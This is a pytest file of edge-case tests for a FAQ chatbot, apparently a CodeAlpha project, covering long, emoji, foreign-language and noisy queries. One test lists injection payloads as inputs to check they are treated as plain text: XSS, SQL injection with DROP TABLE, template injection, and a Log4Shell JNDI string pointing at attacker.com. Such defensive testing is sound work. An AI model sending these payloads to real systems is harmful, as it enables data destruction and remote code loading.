"""
tests/test_edge_cases.py
Adversarial and boundary stress tests for the CodeAlpha FAQ Chatbot.

Tests extreme query lengths, unicode emojis, script/SQL injection strings,
foreign language inputs, and noisy alphanumeric text.
"""

import pytest
from src.config import AppConfig
from src.knowledge_base import FAQKnowledgeBase
from src.matcher import FAQMatcher
from src.preprocessor import TextPreprocessor


@pytest.fixture(scope="module")
def matcher():
    """Module-level fitted FAQMatcher fixture."""
    kb = FAQKnowledgeBase("data/faqs.json")
    kb.load()
    preprocessor = TextPreprocessor()
    config = AppConfig.load_from_env()

    m = FAQMatcher(knowledge_base=kb, preprocessor=preprocessor, config=config)
    m.fit()
    return m


def test_extremely_long_query(matcher):
    """Verify application handles queries exceeding 1000 characters gracefully."""
    long_query = "tuition fees " * 150
    assert len(long_query) > 1000
    res = matcher.match(long_query)
    # The term 'tuition fee' is heavily repeated, should safely match tuition FAQ without memory error
    assert res.status in ("MATCH_FOUND", "FALLBACK")
    assert res.confidence_score >= 0.0


def test_unicode_emojis(matcher):
    """Verify queries containing emojis do not cause regex or encoding crashes."""
    emoji_queries = [
        "🎓💳📚",
        "😀 😃 😄 😁 😆",
        "How do I pay fees? 💳💰💵",
        "Where can I find books? 📚📖",
    ]
    for eq in emoji_queries:
        res = matcher.match(eq)
        assert res.status in ("MATCH_FOUND", "FALLBACK", "EMPTY_QUERY")
        assert isinstance(res.answer, str)


def test_script_and_sql_injection_payloads(matcher):
    """Verify malicious payloads are treated as plain text without execution or unhandled exceptions."""
    malicious_inputs = [
        "<script>alert('XSS')</script>",
        "SELECT * FROM faqs WHERE id = '1' OR '1'='1';",
        "'; DROP TABLE faqs; --",
        "{{ 7 * 7 }}",
        "${jndi:ldap://attacker.com/a}",
    ]
    for payload in malicious_inputs:
        res = matcher.match(payload)
        # Should either cleanly trigger FALLBACK or EMPTY_QUERY safely
        assert res.status in ("FALLBACK", "EMPTY_QUERY")
        assert res.matched_faq is None


def test_foreign_language_queries(matcher):
    """Verify non-English queries safely trigger fallback rather than hallucinating."""
    foreign_queries = [
        "こんにちは、授業料の支払い方法は？",  # Japanese
        "Comment puis-je payer mes frais de scolarité?",  # French
        "كيف يمكنني دفع الرسوم الدراسية؟",  # Arabic
        "আমি কীভাবে আমার সেমিস্টার ফি দেব?",  # Bengali
        "Wie kann ich meine Studiengebühren bezahlen?",  # German
    ]
    for fq in foreign_queries:
        res = matcher.match(fq)
        # Non-English queries without English vocabulary overlap should trigger FALLBACK or EMPTY_QUERY
        assert res.status in ("FALLBACK", "EMPTY_QUERY")
        assert res.confidence_score < 0.30


def test_mixed_case_noise(matcher):
    """Verify extreme casing variations are normalized consistently."""
    query = "hOw Do I rEgIsTeR fOr SeMeStEr CoUrSeS?"
    res = matcher.match(query)
    assert res.status == "MATCH_FOUND"
    assert res.matched_faq is not None
    assert res.matched_faq.id == "faq_acad_001"
    assert res.confidence_score >= 0.80


def test_special_alphanumeric_codes(matcher):
    """Verify specific course code queries are processed safely."""
    query = "Where is the syllabus for CS 101 or MATH 202?"
    res = matcher.match(query)
    assert isinstance(res.status, str)
    assert isinstance(res.answer, str)
